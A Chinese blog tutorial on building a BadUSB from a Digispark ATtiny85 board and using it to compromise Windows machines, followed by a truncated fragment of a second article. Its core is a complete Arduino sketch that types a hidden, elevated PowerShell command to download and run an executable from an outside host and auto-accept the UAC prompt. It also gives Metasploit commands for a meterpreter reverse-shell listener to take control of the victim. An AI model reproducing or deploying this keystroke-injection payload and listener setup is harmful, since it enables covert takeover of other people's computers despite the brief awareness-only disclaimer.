# Badusb制作及使用（渗透windows）

已于 2022-07-11 11:05:23 修改

- [2021.04.07] - [https://github.com/Xyntax/BadUSB-code](https://github.com/Xyntax/BadUSB-code) - 收集badusb的一些利用方式及代码

> 推荐：![](https://forum.ywhack.com/images/bountytips/3stars.gif) | 编程语言: PowerShell | 仍在维护：×

**目录**

[一、安装Dpinst驱动](https://blog.csdn.net/QQ670663/article/details/125362082#t0)

[二、配置Automator](https://blog.csdn.net/QQ670663/article/details/125362082#t1)

[三、实现插入Babusb远程渗透windows系统](https://blog.csdn.net/QQ670663/article/details/125362082#t2)



“BadUSB”是计算机安全领域的热门话题之一，该漏洞由Karsten Nohl和Jakob Lell共同发现，并在BlackHat安全大会上公布。

BadUSB最可怕的一点是恶意代码存在于U盘的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。



**BadUSB****原理**：

BadUSB出现之前，利用HID(Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等)进行攻击的两种类型。分别是"USB rubberducky"和"Teensy"。

**什么是USB rubberducky？**

简称USB橡皮鸭，是最早的按键注入工具，通过嵌入式开发板实现，后来发展成为一个完全成熟的商业化按键注入攻击平台。它的原理同样是将USB设备模拟成为键盘，让电脑识别成为键盘，然后进行脚本模拟按键进行攻击。

**什么是Teensy？**

攻击者在定制攻击设备时，会向USB设备中置入一个攻击芯片，此攻击芯片是一个非常小而且功能完整的单片机开发系统，它的名字叫TEENSY。通过TEENSY你可以模拟出一个键盘和鼠标，当你插入这个定制的USB设备时，电脑会识别为一个键盘，利用设备中的微处理器与存储空间和编程进去的攻击代码，就可以向主机发送控制命令，从而完全控制主机，无论自动播放是否开启，都可以成功。



**Digispark USB Development Board是一块基于ATTiny85微控制器的开发板。**



**BadUSB****是USB的一款严重漏洞。攻击者可利用该缺陷，在有效且不被检测到的情况下，执行恶意代码。**

所需工具：DPinst（badusb驱动）、Automator（脚本代码生成工具）、arduino（脚本代码烧录工具）、notepad（代码编辑工具）、

网址：https://nixu-corp.github.io/（代码转换网址）、https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads（脚本代码网址）

![img](https://i-blog.csdnimg.cn/blog_migrate/74836c72172f16a324496abafbdb74c1.png)

![img](https://i-blog.csdnimg.cn/blog_migrate/062f681046ae1b973e352dc0156b6b6b.png)



链接: https://pan.baidu.com/s/1j11XNhpVM9K_C6AVoG_Qsg  密码: 6k3l





### **一、安装Dpinst驱动**

1、安装驱动

64位操作系统安装选择DPinst64,32位操作系统选择DPinst打开Digistump文件夹-DPinst64.exe

![img](https://i-blog.csdnimg.cn/blog_migrate/f185b5a5311fa2ef84e1f5a8bb5b53dc.png)

下一步-安装(勾选始终信任来自“Digistump LLC的软件”)



 ![img](https://i-blog.csdnimg.cn/blog_migrate/2bacef2529aa8d66400c22c255ce3e0f.png)

### **二、配置Automator**

1、安装Didispark-attint85开发板,Arduino没有自带所以需要到开发板管理器下载

文件-首选项

 ![img](https://i-blog.csdnimg.cn/blog_migrate/5555959ffce039b0e3c435f41000e264.png)

2、附加开发版管理网址：http://digistump.com/package_digistump_index.json

![img](https://i-blog.csdnimg.cn/blog_migrate/4ea5f496975b9ab3691da176c3359fbf.png)

3、依次点击：工具-开发板-开发板管理

![img](https://i-blog.csdnimg.cn/blog_migrate/85d2ba83f10e264b18ad9128a8292185.png)

4、找到Digistump AVR Boards by Digistump后选择-安装 (注意：因开发板管理网址为国外网址所以安装开发板时需要开代理也就是梯子) 

 ![img](https://i-blog.csdnimg.cn/blog_migrate/6454859315ed6f1150eb3aa7625aa663.png)

5、digispark开发板安装完成后点击：工具-开发板-Digispark(Default-16.5mhz) 

![img](https://i-blog.csdnimg.cn/blog_migrate/0aeef93e3e56436cc055fad0d3548a84.png)

6、设置编程器为：USBtinyISP

点击：工具-编程器- USBtinyISP

 ![img](https://i-blog.csdnimg.cn/blog_migrate/f8ee4f4abf3fc73d92297947fd95b335.png)![img](https://i-blog.csdnimg.cn/blog_migrate/5d0c70ec950cf1bcafa2551a5661aedb.png)



 7、文件-示例-DigisparkKeybosrd-Keyboard

![img](https://i-blog.csdnimg.cn/blog_migrate/f7d06e0db9247cf19bf7fd349ccb864c.png)

 8、输入代码编译完成后选择上传，60秒内插入BadUSB开发板

![img](https://i-blog.csdnimg.cn/blog_migrate/b789cfe2dadd12e3edb0f1807ac7bcf0.png)

9、提示上传成功即代码成功烧录到BadUSB开发版中 

![img](https://i-blog.csdnimg.cn/blog_migrate/56baf27797bdc101244a5d4910bf1d84.png)

10、使用Automator编写键盘鼠标事件代码。简单演示一下插入Badusb后自动打开计算器。

![img](https://i-blog.csdnimg.cn/blog_migrate/1af1165ff117a642a2fa5217e03d3bad.png)

11、把Automator生成的代码复制到Arduino;点击上传按钮60秒内插入badusb盘（等待几秒写入完成即可拔出badusb盘）

![img](https://i-blog.csdnimg.cn/blog_migrate/f1cd8775e12c279c62980127d3665f1d.png)

12、写入成功提示Thank you

![img](https://i-blog.csdnimg.cn/blog_migrate/cbb2801345e5ac88d953cafac5567d8e.png)

插入写入代码完成的badusb盘演示： 

1、

![img](https://i-blog.csdnimg.cn/blog_migrate/c3e69992c4ab18903378c2f969c79e46.png)

2、

![img](https://i-blog.csdnimg.cn/blog_migrate/2155c58a31126cfa6bd61616d8e7e039.png)

3、

![img](https://i-blog.csdnimg.cn/blog_migrate/58f85700f8c8316d27062314c6f18abb.png)

### **三、实现插入Babusb远程渗透windows系统**

powershell远程下载并自动执行木马程序代码：

```cpp
#include "DigiKeyboard.h"



 



void setup() {



 



  pinMode(1, OUTPUT);//可用可不用



 



  DigiKeyboard.sendKeyStroke(0);//初始化



 



  delay(3000);//延时



 



  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//WIN+R



 



  delay(500);



 



  DigiKeyboard.sendKeyStroke(0);



 



  //delay(500);



 



  //DigiKeyboard.println("CMD.EXE /t:01 /k MODE con: cols=16 lines=2");



 



  delay(500);



 



  DigiKeyboard.println("POWERSHELL -NOP -W HIDDEN -C \"sTART-pROCESS -fILEpATH POWERSHELL.EXE \'-NOP -W HIDDEN -C iNVOKE-wEBrEQUEST -URI HTTP://BADUSB.PW/1.EXE -oUTfILE C:\\X.EXE;C:\\X.EXE\' -vERB RUNAS\"");//尽量其他盘 更改HTTP://BADUSB.PW/1.EXE为你程序的下载直连



 



  DigiKeyboard.println();



 



  delay(4500);



 



  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); //ALT+Y键 用于需要按管理员确定



 



}



 



 



 



void loop() {



 



  //这里只是让灯亮



 



  digitalWrite(1, HIGH);



 



  delay(100);               // wait for a second



 



  digitalWrite(1, LOW);



 



  delay(500);



 



  digitalWrite(1, HIGH);



 



  delay(100);               // wait for a second



 



 



}
```

1、点击上传60秒内插入Badusb盘等待几秒时间写入成功

![img](https://i-blog.csdnimg.cn/blog_migrate/c4163ad5848ac03286b4b05090293f3a.png)

2、写入成功提示Thank you

 ![img](https://i-blog.csdnimg.cn/blog_migrate/e8792604f59d2a34ade0243bf8ab681f.png)

 3、准备MSF控制端

打开Kali系统—打开终端

打开msf设置payload，加载攻击模块设置本地IP和监听端口

```undefined
msfconsole
```

![img](https://i-blog.csdnimg.cn/blog_migrate/895c13765196ba080b3419d8b51fde60.png)

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST 192.168.245.140

set LPORT 4444

![img](https://i-blog.csdnimg.cn/blog_migrate/f3ec888bad54d9ca5bab83799fa1fd52.png)

show options （查看IP端口设置情况）

run （开启监听）

![img](https://i-blog.csdnimg.cn/blog_migrate/95733ba055744fa571027b2a36e05d82.png)

4、Budusb插入目标机自动下载并且运行木马-反弹shell-操控目标机 

[视频演示：1655646347015765-CSDN直播](https://live.csdn.net/v/217576)



本教材仅用于信息安全防范，提高信息安全意识，请勿用于其他用途，请且行且珍惜。 





文章目录设备软件编写代码（重点） 设备 

1、 能够*制作**bad**usb*的几种常见载体有：Arduino Leonardo、Phison、Teensy、Attiny85、PS2303（芯片）、RUBBER DUCKY等。从专业程度和易用性来讲，RUBBER DUCKY最优（Hak5官方提供了许多现成的按键脚本和payload），但价格也最贵。 

2、 一台计算机 软件 下载Arduino开发者工具——Arduino IDE (用来向leonardo烧录程序的软件) 这里是Arduino IDE下载地址：http

